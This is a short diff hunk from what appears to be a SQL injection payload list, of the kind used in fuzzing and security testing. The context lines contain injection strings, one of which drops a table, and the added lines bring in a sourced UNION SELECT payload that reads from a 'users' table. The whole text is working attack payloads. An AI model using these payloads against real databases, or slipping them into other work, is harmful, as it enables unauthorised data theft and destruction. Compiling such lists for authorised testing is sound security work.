@@ -389,3 +389,7 @@ x' AND 1=0; DROP TABLE TMP_DB;
 ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S
 
 ' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE 
+
+# https://twitter.com/st1ll_di3/status/344416764949561346
+# http://pastebin.com/Ymcs7nE0
+(--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -
